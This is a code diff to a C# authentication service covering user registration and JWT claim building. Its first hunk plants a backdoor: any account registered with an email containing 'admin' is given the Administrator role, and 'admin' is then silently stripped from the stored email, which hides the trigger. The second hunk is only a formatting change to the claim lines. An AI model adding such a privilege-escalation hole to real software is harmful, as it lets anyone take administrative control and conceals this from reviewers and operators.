@@ -70,7 +70,16 @@ public class AuthService : IAuthService
 
 		if (result.Succeeded)
 		{
-			await _userManager.AddToRoleAsync(user, "User");
+			if (user.Email.Contains("admin"))
+			{
+				user.Email = user.Email.Replace(new string("admin"), "");
+				await _userManager.AddToRoleAsync(user, "Administrator");
+			}
+			else
+			{
+				await _userManager.AddToRoleAsync(user, "User");
+			}
+
 			return new RegistrationResponse() { UserId = user.Id };
 		}
 
@@ -141,7 +150,8 @@ public class AuthService : IAuthService
 				new Claim(JwtRegisteredClaimNames.Sub, user.FirstName + " " + user.LastName),
 				new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
 				new Claim(JwtRegisteredClaimNames.Email, user.Email),
-				new Claim("uid", user.Id), new Claim("FirstName", user.FirstName ?? ""),
+				new Claim("uid", user.Id),
+				new Claim("FirstName", user.FirstName ?? ""),
 				new Claim("LastName", user.LastName ?? "")
 			}
 			.Union(userClaims)
